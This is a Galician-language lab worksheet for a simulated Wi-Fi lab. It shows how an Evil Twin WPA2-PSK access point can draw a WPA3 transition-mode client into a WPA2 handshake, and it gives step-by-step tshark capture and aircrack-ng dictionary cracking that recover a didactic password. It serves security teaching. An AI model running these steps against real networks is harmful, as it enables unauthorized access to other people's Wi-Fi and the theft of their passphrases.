Práctica 3.3 — WPA3-SAE: modo transición, simulación de DoS e Evil Twin WPA2-PSK

Laboratorio autorizado

Realizar exclusivamente na máquina virtual do laboratorio vuln-wifi.lab, con radios mac80211_hwsim. Non executar estes procedementos sobre redes alleas.

Documento de referencia

Práctica 3-Taller-HE-Practica-WiFi-3.pdf, especialmente a configuración dos AP, a simulación da caída do AP lexítimo e a auditoría WPA2-PSK das páxinas 10–18. Este procedemento adapta as interfaces e os comandos ao escenario automatizado wpa3_sae_vulnerable.

1. Obxectivo e alcance

Comprobar como un cliente configurado para modo transición (SAE WPA-PSK) pode intentar autenticarse mediante WPA2-PSK cando deixa de estar dispoñible o punto de acceso lexítimo. O experimento emprega dous AP co mesmo SSID EMPRESA-XYZ:

  • AP lexítimo: admite WPA3-SAE e WPA2-PSK; contrasinal didáctico spongebob19.
  • Evil Twin: anuncia só WPA2-PSK e utiliza calqueracousa, un contrasinal diferente do configurado no cliente.
  • Cliente: admite SAE e WPA-PSK, inicialmente conectado ao AP lexítimo mediante SAE.

O procedemento permite identificar os dous AP, provocar o intento de conexión WPA2-PSK, capturar as mensaxes EAPOL e recuperar o contrasinal didáctico mediante aircrack-ng.

Que demostra a práctica

Non se executa nin se demostra unha explotación Dragonblood ou un DoS real. Seguindo a alternativa do PDF, detense de forma controlada o AP lexítimo para simular a súa indispoñibilidade. Só falaremos de intento de downgrade se os rexistros ou a captura amosan o cliente negociando WPA2-PSK co Evil Twin. A aparición dun AP falso non implica automaticamente que o cliente o seleccione nin que se complete a conexión.

2. Material e distribución das terminais

  • Kali con wifilabctl, iw, wpa_cli, tshark e aircrack-ng.
  • Escenario wpa3_sae_vulnerable con catro radios virtuais.
  • Catro terminais abertas en Kali; todos os comandos parten do namespace global, salvo onde se indica ip netns exec.

| Terminal | Radio / namespace | Función | |---|---|---| | 1 | wlan0 / phy0_wlan0 | AP lexítimo e simulación da súa caída | | 2 | wlan1 / phy1_wlan1 | Estado e reconexión do cliente | | 3 | wlan2 / evil_twin_wlan2 | AP falso WPA2-PSK e rexistros | | 4 | hwsim0 (global); wlan3 libre | Recoñecemento, captura e auditoría |

Non interromper os servizos do laboratorio

Non executar airmon-ng check kill, pkill hostapd sen filtrar por PID, nin wifilabctl down durante a captura. Os dous AP xa son iniciados por wifilabctl. A interface global hwsim0 permite capturar as tramas virtuais sen reconfigurar wlan3 nin depender de iw dev wlan3 scan, que pode devolver Device or resource busy (-16).

3. Terminal 1 — Arrancar e comprobar o escenario

sudo wifilabctl up wpa3_sae_vulnerable
sudo wifilabctl status

Deben aparecer os namespaces phy0_wlan0, phy1_wlan1 e evil_twin_wlan2, coas radios wlan0, wlan1 e wlan2, e wlan3 na contorna global.

Consultar o estado do AP lexítimo:

sudo ip netns exec phy0_wlan0 iw dev wlan0 info

LAB=/home/kali/wifiLab/run/wpa3_sae_vulnerable
sudo grep -E '^(ssid|channel|wpa|wpa_key_mgmt|ieee80211w|sae_require_mfp|wpa_passphrase|sae_password)=' \
  "$LAB/hostapd.conf"

Parámetros de interese:

ssid=EMPRESA-XYZ
channel=6
wpa_key_mgmt=WPA-PSK SAE
ieee80211w=1
sae_require_mfp=1
wpa_passphrase=spongebob19
sae_password=spongebob19

O BSS anuncia PMF opcional para compatibilidade con WPA2, pero sae_require_mfp=1 obriga a utilizalo nas asociacións SAE. Non confundir ieee80211w=1 con PMF desactivado.

4. Terminal 2 — Comprobar a conexión inicial do cliente

sudo ip netns exec phy1_wlan1 iw dev wlan1 link
sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 status

Comprobar especialmente:

ssid=EMPRESA-XYZ
key_mgmt=SAE
wpa_state=COMPLETED

Anotar o BSSID ao que está conectado o cliente: é o AP lexítimo. Os enderezos MAC/BSSID son dinámicos e non deben copiarse de exemplos anteriores.

Comprobar o perfil de transición do cliente:

sudo grep -E '(ssid=|key_mgmt=|ieee80211w=|sae_password=|psk=)' \
  /home/kali/wifiLab/run/wpa3_sae_vulnerable/wpa_supplicant.conf

Debe observarse key_mgmt=SAE WPA-PSK.

5. Terminal 3 — Comprobar o Evil Twin

sudo ip netns exec evil_twin_wlan2 iw dev wlan2 info

LAB=/home/kali/wifiLab/run/wpa3_sae_vulnerable
sudo grep -E '^(ssid|channel|wpa_key_mgmt|wpa_passphrase|ieee80211w)=' \
  "$LAB/hostapd_eviltwin.conf"

sudo grep -E 'AP-ENABLED|AP-DISABLED|failed|error' \
  "$LAB/hostapd_eviltwin.log" | tail -n 20

Debe aparecer type AP, o SSID EMPRESA-XYZ, wpa_key_mgmt=WPA-PSK, o contrasinal calqueracousa e a mensaxe AP-ENABLED.

Para obter os BSSID reais en calquera terminal:

AP_BSSID=$(sudo ip netns exec phy0_wlan0 iw dev wlan0 info | awk '$1=="addr" {print tolower($2); exit}')
EVIL_BSSID=$(sudo ip netns exec evil_twin_wlan2 iw dev wlan2 info | awk '$1=="addr" {print tolower($2); exit}')
echo "AP lexítimo: $AP_BSSID"
echo "Evil Twin:   $EVIL_BSSID"

6. Terminal 4 — Identificar os dous AP mediante hwsim0

A interface wlan3 pode estar ocupada e non precisamos executar iw dev wlan3 scan. Empregamos a interface global de monitorización hwsim0:

ip link show hwsim0
sudo ip link set dev hwsim0 up
ip link show hwsim0

sudo tshark -i hwsim0 -a duration:15 \
  -Y 'wlan.fc.type_subtype == 8 && wlan.ssid == "EMPRESA-XYZ"' \
  -T fields -e wlan.bssid -e wlan.ssid | sort -u

A saída debería incluír dous BSSID distintos co SSID EMPRESA-XYZ. Os dous AP emiten Beacon, pero anuncian diferentes suites de autenticación. Se a captura de 15 segundos non amosa Beacon, comprobar os AP cos comandos das seccións 3 e 5 e continuar: a ausencia desa saída non proba por si soa que o AP estea apagado.

Se `hwsim0` aparece `state DOWN` ou `tshark` informa `Permission denied`

wifilabctl up pode deixar a interface global hwsim0 en estado DOWN. Antes da captura, activar a interface no namespace global:

sudo ip link set dev hwsim0 up
ip -br link show hwsim0

Repetir a captura de Beacon. Se continúa o erro, realizar unha comprobación independente con tcpdump (non é necesario cambiar permisos nin reinstalar Wireshark):

sudo tcpdump -i hwsim0 -c 10 -w /tmp/proba-hwsim0.pcap
sudo tshark -r /tmp/proba-hwsim0.pcap \
  -Y 'wlan.fc.type_subtype == 8' \
  -T fields -e wlan.bssid -e wlan.ssid | sort -u

Se tcpdump captura correctamente e tshark en directo continúa fallando, para a sección 7 pode substituírse a captura por sudo tcpdump -i hwsim0 -w /tmp/wpa3-3.3-transicion.pcap; detela con Ctrl+C e empregar tshark -r para a análise posterior, substituíndo o nome do ficheiro .pcapng polo .pcap. Se tcpdump tamén falla, revisar a saída de sudo dumpcap -D, ip link show hwsim0 e sudo tcpdump -i hwsim0 -c 3, antes de continuar coa práctica. Non modificar permisos de dumpcap ás cegas.

É posible consultar a información RSN dos Beacon gardando previamente unha captura curta:

sudo tshark -i hwsim0 -a duration:10 -w /tmp/wpa3-3.3-beacons.pcapng

sudo tshark -r /tmp/wpa3-3.3-beacons.pcapng \
  -Y 'wlan.fc.type_subtype == 8 && wlan.ssid == "EMPRESA-XYZ"' \
  -T fields -e frame.number -e wlan.bssid -e wlan.ssid

7. Terminal 4 — Iniciar a captura principal

Iniciar a captura ANTES de deter o AP lexítimo. Deixala en marcha mentres se executan as seccións 8–10:

sudo tshark -i hwsim0 -w /tmp/wpa3-3.3-transicion.pcapng

Non hai un tempo límite automático. Ao finalizar o intento de reconexión, volver a esta terminal e deter a captura con Ctrl+C. O ficheiro escríbese en /tmp/ para evitar problemas de permisos de dumpcap no directorio persoal.

Por que `hwsim0`?

En mac80211_hwsim, hwsim0 permite observar o tráfico entre radios simuladas sen mover a radio atacante a modo monitor. É adecuado para este laboratorio, mesmo cando iw dev wlan3 scan devolve Device or resource busy (-16).

8. Terminal 1 — Simular a caída do AP lexítimo

O PDF describe primeiro a limitación de dragondrain con mac80211_hwsim e propón a simulación da indispoñibilidade do AP. Co laboratorio automatizado debemos finalizar só o proceso hostapd do namespace phy0_wlan0.

Localizar o proceso:

sudo ip netns pids phy0_wlan0

for pid in $(sudo ip netns pids phy0_wlan0); do
    printf 'PID=%s PROCESO=%s\n' "$pid" "$(cat /proc/"$pid"/comm 2>/dev/null)"
done

Detelo de forma selectiva:

for pid in $(sudo ip netns pids phy0_wlan0); do
    if [ "$(cat /proc/"$pid"/comm 2>/dev/null)" = "hostapd" ]; then
        echo "Detendo AP lexítimo: PID=$pid"
        sudo kill -TERM "$pid"
    fi
done
Importante

Non executar sudo pkill hostapd: podería deter tamén o Evil Twin, porque os namespaces de rede non illan a lista de procesos. A selección por PID anterior evita ese problema.

Comprobar que segue vivo o Evil Twin:

sudo ip netns exec evil_twin_wlan2 iw dev wlan2 info
sudo ip netns pids evil_twin_wlan2

O Evil Twin debe continuar en type AP. A caída manual do AP lexítimo simula unha indispoñibilidade; non constitúe unha proba de DoS.

9. Terminal 2 — Comprobar o intento de conexión ao Evil Twin

Tras deter o AP lexítimo, pedir ao cliente que busque unha conexión:

sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 reconnect
sleep 10
sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 status
sudo ip netns exec phy1_wlan1 iw dev wlan1 link

Se non se observa actividade, provocar unha nova reconexión controlada:

sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 disconnect
sleep 2
sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 reconnect
sleep 10
sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 status

O cliente pode intentar WPA2-PSK co Evil Twin, porque o seu perfil admite SAE WPA-PSK. Dado que a PSK do Evil Twin é distinta, a autenticación non debería completarse correctamente. Un estado Not connected non demostra por si só que se emitise un handshake: cómpre revisar os rexistros e a captura.

10. Terminal 3 — Revisar os rexistros do Evil Twin

sudo tail -n 100 \
  /home/kali/wifiLab/run/wpa3_sae_vulnerable/hostapd_eviltwin.log

Mensaxes de especial interese:

wlan2: STA ... IEEE 802.11: authenticated
wlan2: STA ... IEEE 802.11: associated
wlan2: AP-STA-POSSIBLE-PSK-MISMATCH ...

Estas mensaxes, se aparecen, indican que un cliente intentou autenticarse no AP falso cunha PSK que non coincide coa súa. AP-STA-POSSIBLE-PSK-MISMATCH non significa que o contrasinal do cliente se transmitise en claro.

11. Terminal 4 — Deter e analizar a captura

Volver á terminal onde se executa tshark -i hwsim0 -w ... e premer Ctrl+C.

Comprobar o ficheiro:

sudo capinfos /tmp/wpa3-3.3-transicion.pcapng

Listar os paquetes EAPOL:

sudo tshark -r /tmp/wpa3-3.3-transicion.pcapng \
  -Y 'eapol' -T fields \
  -e frame.number -e _ws.col.Info \
  -e wlan.bssid -e wlan.sa -e wlan.da \
  -e eapol.keydes.replay_counter \
  -e wlan_rsna_eapol.keydes.msgnr

Distinguir o EAPOL do Evil Twin do correspondente ao AP lexítimo. Obter o BSSID real do Evil Twin e filtrar:

EVIL_BSSID=$(sudo ip netns exec evil_twin_wlan2 iw dev wlan2 info | awk '$1=="addr" {print tolower($2); exit}')

echo "Filtrando EAPOL do Evil Twin: $EVIL_BSSID"
sudo tshark -r /tmp/wpa3-3.3-transicion.pcapng \
  -Y "eapol && wlan.bssid == $EVIL_BSSID" -T fields \
  -e frame.number -e _ws.col.Info -e wlan.sa -e wlan.da \
  -e eapol.keydes.replay_counter

Para observar tamén as tramas de autenticación e asociación:

sudo tshark -r /tmp/wpa3-3.3-transicion.pcapng \
  -Y "wlan.bssid == $EVIL_BSSID && (wlan.fc.type_subtype == 0x000b || wlan.fc.type_subtype == 0x0000 || eapol)" \
  -T fields -e frame.number -e _ws.col.Info -e wlan.sa -e wlan.da

Interpretación:

  • EAPOL dirixidos ao BSSID do Evil Twin: evidencian o intento de autenticación WPA2-PSK co punto de acceso falso.
  • Mensaxes de autenticación ou asociación e PSK distinta: o cliente pode enviar información suficiente para verificar unha PSK sen completar a conexión.
  • Auditoría do paso 12: Aircrack-ng confirmou a recuperación de spongebob19, polo que a captura obtida nesta execución contiña material WPA2-PSK válido.

12. Terminal 4 — Auditoría do contrasinal WPA2-PSK con Aircrack-ng

A captura do intento de conexión WPA2-PSK co Evil Twin permite auditar o contrasinal que utiliza o cliente. A rede lexítima utiliza SAE inicialmente; esta proba non consiste en descifrar SAE.

Empregar un dicionario didáctico de tres entradas para comprobar o intercambio WPA2-PSK capturado:

printf 'contraseña-de-proba\nspongebob19\nclave-incorrecta\n' > /tmp/wpa3-3.3-dicionario.txt

EVIL_BSSID=$(sudo ip netns exec evil_twin_wlan2 iw dev wlan2 info | awk '$1=="addr" {print tolower($2); exit}')

sudo aircrack-ng -b "$EVIL_BSSID" \
  -w /tmp/wpa3-3.3-dicionario.txt \
  /tmp/wpa3-3.3-transicion.pcapng

A saída comprobada na VM con Aircrack-ng 1.7 foi:

Aircrack-ng 1.7

[00:00:00] 3/3 keys tested (80.71 k/s)

KEY FOUND! [ spongebob19 ]

O resultado confirma que a captura WPA2-PSK permite verificar o contrasinal spongebob19, malia que o Evil Twin anuncie outra PSK e a asociación non chegue a completarse. O handshake SAE inicial do AP lexítimo non se rompeu.

Auditoría adicional co dicionario rockyou empregado no PDF:

if [ -f /usr/share/wordlists/rockyou.txt ]; then
    cp /usr/share/wordlists/rockyou.txt /tmp/rockyou-3.3.txt
elif [ -f /usr/share/wordlists/rockyou.txt.gz ]; then
    gzip -dc /usr/share/wordlists/rockyou.txt.gz > /tmp/rockyou-3.3.txt
fi

# Executar con rockyou cando o ficheiro estea dispoñible:
EVIL_BSSID=$(sudo ip netns exec evil_twin_wlan2 iw dev wlan2 info | awk '$1=="addr" {print tolower($2); exit}')
sudo aircrack-ng -b "$EVIL_BSSID" \
  -w /tmp/rockyou-3.3.txt \
  /tmp/wpa3-3.3-transicion.pcapng

A verificación confirmada nesta práctica corresponde ao dicionario de tres entradas. A opción rockyou reproduce a auditoría con dicionario amplo do PDF, sen ser necesaria para demostrar a recuperación da clave.

Que significa recuperar `spongebob19`?

Significa que se puido verificar offline un contrasinal candidato a partir dunha captura WPA2-PSK do cliente. Non significa que se descifrase SAE nin que o Evil Twin chegase a establecer unha sesión cifrada con éxito. A diferenza entre as dúas autenticacións é o obxectivo central desta práctica.

13. Restaurar o laboratorio

A simulación da caída do AP lexítimo interrompe un proceso do escenario. Para restaurar a topoloxía funcional:

sudo wifilabctl up wpa3_sae_vulnerable
sudo wifilabctl status
sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 status

O cliente debería volver conectarse mediante SAE ao AP lexítimo. Os ficheiros de captura e os dicionarios gardados en /tmp poden permanecer ata o seguinte reinicio do sistema.

14. Resultado e interpretación da práctica

O procedemento permite comprobar as seguintes evidencias. A recuperación do contrasinal co dicionario de tres palabras foi verificada na VM:

| Observación | Conclusión que permite | |---|---| | Dous BSSID con SSID idéntico e RSN diferente | Coexistencia de AP lexítimo e Evil Twin | | key_mgmt=SAE e COMPLETED antes da simulación | Autenticación WPA3-SAE inicial correcta | | AP lexítimo detido, Evil Twin activo | Indispoñibilidade simulada, non DoS probado | | Cliente tenta WPA2-PSK contra o BSSID do Evil Twin | Intento real de selección/degradación cara a WPA2 | | EAPOL de WPA2-PSK capturado e aceptado por Aircrack-ng | Captura válida para a auditoría offline | | KEY FOUND mediante Aircrack-ng | Resultado verificado: spongebob19, a partir do intercambio WPA2 capturado |

A captura obtida durante o intento WPA2-PSK foi suficiente para verificar o MIC e recuperar spongebob19. O experimento non require que o Evil Twin estableza unha conexión completada. A caída do AP lexítimo foi simulada: non se demostrou un DoS por Dragondrain nin a recuperación dunha clave mediante o intercambio SAE.
